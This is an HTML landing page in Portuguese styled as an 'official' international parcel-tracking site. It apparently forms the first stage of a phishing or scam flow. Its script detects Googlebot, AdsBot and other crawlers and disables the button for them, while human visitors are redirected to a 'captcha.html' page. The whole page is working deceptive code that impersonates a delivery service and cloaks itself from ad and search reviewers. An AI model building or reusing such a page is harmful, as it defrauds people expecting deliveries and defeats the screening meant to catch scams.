<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acompanhar Encomenda</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffe600;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background: #fff;
      width: 90%;
      max-width: 420px;
      padding: 30px 20px;
      border-radius: 16px;
      box-shadow: 0 0 16px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 {
      color: #003366;
      margin-bottom: 10px;
    }
    p {
      color: #000;
      font-size: 16px;
      margin-bottom: 20px;
    }
    .botao {
      display: inline-block;
      padding: 14px 22px;
      font-size: 18px;
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      animation: blink 1.2s infinite;
    }
    .botao.desativado {
      background-color: #ccc;
      cursor: not-allowed;
      animation: none;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.6; }
    }
    .aviso {
      font-size: 12px;
      color: #444;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Acompanhar Encomenda</h1>
    <p>Verifique atualizações da sua encomenda internacional.</p>
    <button id="btn-consulta" class="botao">Acessar Consulta</button>
    <p class="aviso">Site Oficial.</p>
  </div>

  <script>
    const userAgent = navigator.userAgent.toLowerCase();
    const isBot = /googlebot|adsbot|crawler|spider|mediapartners|slurp/.test(userAgent);
    const botao = document.getElementById("btn-consulta");

    if (isBot) {
      botao.classList.add("desativado");
      botao.innerText = "Bot Detectado";
      botao.disabled = true;
    } else {
      botao.addEventListener("click", function () {
        botao.innerText = "Verificando...";
        setTimeout(() => {
          window.location.href = "captcha.html";
        }, 1200);
      });
    }
  </script>

</body>
</html>
